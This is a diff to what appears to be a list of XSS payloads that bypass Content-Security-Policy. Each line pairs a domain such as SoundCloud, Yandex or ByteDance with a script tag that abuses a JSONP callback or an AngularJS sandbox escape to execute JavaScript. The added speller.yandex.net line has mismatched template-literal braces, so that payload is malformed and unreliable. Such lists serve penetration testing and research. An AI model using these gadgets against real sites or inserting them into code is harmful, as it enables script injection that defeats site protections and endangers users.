@@ -155,6 +155,7 @@ shop.samsung.com	<script src="https://shop.samsung.com/br/_v/private/ng/p4v1/get
 smartcaptcha.yandexcloud.net	<script src="https://smartcaptcha.yandexcloud.net/captcha.js?render=onload&onload=alert"></script>
 social.yandex.ru	<script src="https://social.yandex.ru/providers.jsonp?callback=alert"></script>
 soundcloud.com	<script src="https://soundcloud.com/oembed?format=js&callback=alert&url=https://soundcloud.com/rich-the-kid/plug-walk-1"></script>
+speller.yandex.net  <script src="https://speller.yandex.net/services/spellservice.json/checkText?text=123&callback=alert(`full XSS on ${document.location`));//"></script>
 srv.carbonads.net	<script src="https://srv.carbonads.net/ads/x.json?callback=alert"></script>
 ssl.gstatic.com	<body ng-app ng-csp><script src="//ssl.gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 sso.bytedance.com	<script src="https://sso.bytedance.com/watermark/?callback=alert"></script>
